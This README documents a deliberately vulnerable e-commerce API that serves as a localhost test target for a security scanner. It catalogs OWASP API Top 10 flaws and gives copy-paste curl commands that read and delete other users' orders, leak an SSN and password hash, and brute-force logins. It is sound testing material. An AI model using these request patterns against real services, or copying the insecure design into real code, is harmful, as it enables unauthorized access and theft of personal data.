# Target API (Intentionally Vulnerable Sandbox)

> [!CAUTION]
> **DELIBERATELY VULNERABLE SERVICE**
> 
> This service contains intentional security vulnerabilities designed solely as an authorized demo and testing target for the **SentinelAPI** security scanner.
> 
> **Never deploy publicly. Never expose beyond localhost or the isolated Docker network.**

---

## Overview

The Target API provides a realistic e-commerce and user management REST API implementing the **OWASP API Security Top 10 (2023)** vulnerabilities.

The application includes a runtime security toggle:
- `SECURE=false` (default): All security vulnerabilities are active.
- `SECURE=true`: All security checks, authorization barriers, and rate limiters are enforced.

---

## Vulnerability Catalog

| Flaw Name | OWASP Top 10 | Endpoint | Method | Vulnerable Behavior (`SECURE=false`) | Secure Behavior (`SECURE=true`) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **BOLA (Read)** | API1:2023 | `/orders/{id}` | `GET` | Any authenticated user can read orders belonging to any customer. | Returns `403 Forbidden` unless the caller is the owner or an admin. |
| **BOLA (Write)** | API1:2023 | `/orders/{id}` | `PUT` | Any authenticated user can tamper with shipping address and status of any order. | Returns `403 Forbidden` unless the caller is the owner or an admin. |
| **BOLA (Delete)** | API1:2023 | `/orders/{id}` | `DELETE` | Any authenticated user can delete orders belonging to other customers. | Returns `403 Forbidden` unless the caller is the owner or an admin. |
| **Excessive Data Exposure & BOLA** | API3:2023 / API1:2023 | `/users/{id}` | `GET` | Leaks internal user records including plaintext `ssn` and `password_hash` to any caller. | Returns `403 Forbidden` for other users; caller only sees safe `UserPublic` fields. |
| **Broken Function Level Authorization (BFLA)** | API5:2023 | `/admin/users` | `GET` | Standard customer account can access administrative user directory. | Returns `403 Forbidden` unless user has `role == "admin"`. |
| **Missing Authentication** | API2:2023 | `/reports/summary` | `GET` | Financial and user metrics returned unauthenticated despite OpenAPI requiring `bearerAuth`. | Returns `401 Unauthorized` without a valid signed JWT bearer token. |
| **Missing Rate Limiting** | API4:2023 | `/auth/login` | `POST` | Infinite rapid credential stuffing and brute-force login attempts allowed. | Rejects attempts beyond 10/min with `429 Too Many Requests` and `Retry-After`. |

---

## Copy-Paste Exploit Sequence

Run each command against `http://localhost:9000`.

### Step 0: Acquire Test Token (Login as regular user `userA`)
```bash
TOKEN=$(curl -s -X POST http://localhost:9000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"userA","password":"passA123"}' | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

echo "Acquired UserA token: $TOKEN"
```

### Exploit 1: BOLA Read (API1:2023)
Inspect order 104, which belongs to `userB` (user ID 2):
```bash
curl -i -s http://localhost:9000/orders/104 \
  -H "Authorization: Bearer $TOKEN"
```
*Vulnerable Output*: HTTP 200 with userB's order details (`"user_id": 2`).  
*Secure Output*: HTTP 403 Forbidden.

### Exploit 2: BOLA Write - Modification (API1:2023)
Tamper with the shipping address of userB's order 104:
```bash
curl -i -s -X PUT http://localhost:9000/orders/104 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"shipping_address":"1337 Attacker Lane, Darknet City"}'
```
*Vulnerable Output*: HTTP 200 with updated shipping address.  
*Secure Output*: HTTP 403 Forbidden.

### Exploit 3: BOLA Write - Deletion (API1:2023)
Delete userB's order 104:
```bash
curl -i -s -X DELETE http://localhost:9000/orders/104 \
  -H "Authorization: Bearer $TOKEN"
```
*Vulnerable Output*: HTTP 204 No Content.  
*Secure Output*: HTTP 403 Forbidden.

### Exploit 4: Excessive Data Exposure & BOLA (API3:2023 / API1:2023)
Query user profile of userB (id 2) to leak Social Security Number and password hash:
```bash
curl -i -s http://localhost:9000/users/2 \
  -H "Authorization: Bearer $TOKEN"
```
*Vulnerable Output*: HTTP 200 leaking `"ssn": "444-55-6666"` and `"password_hash"`.  
*Secure Output*: HTTP 403 Forbidden.

### Exploit 5: Broken Function Level Authorization - BFLA (API5:2023)
Access administrative customer database using regular user token:
```bash
curl -i -s http://localhost:9000/admin/users \
  -H "Authorization: Bearer $TOKEN"
```
*Vulnerable Output*: HTTP 200 with complete directory of all registered accounts.  
*Secure Output*: HTTP 403 Forbidden.

### Exploit 6: Broken Authentication / Missing Auth (API2:2023)
Fetch executive report without providing any authentication headers:
```bash
curl -i -s http://localhost:9000/reports/summary
```
*Vulnerable Output*: HTTP 200 returning `{total_orders, total_revenue, total_users}`.  
*Secure Output*: HTTP 401 Unauthorized.

### Exploit 7: Missing Rate Limiting (API4:2023)
Send 15 rapid brute-force login attempts with invalid passwords:
```bash
for i in {1..15}; do
  curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" -X POST http://localhost:9000/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"userA","password":"wrongpassword"}'
done
```
*Vulnerable Output*: All 15 attempts return HTTP 401 (no rate limiting).  
*Secure Output*: Attempts 1-10 return HTTP 401; attempts 11-15 return HTTP 429 Too Many Requests.

---

## Resetting Test State

To reset all seed data and clear rate limiters back to initial baseline:
```bash
curl -X POST http://localhost:9000/_reset
```

---

## Public Endpoints (No Auth Required)

- `GET /products`
- `GET /products/{id}`
- `GET /health`
- `GET /openapi.json`
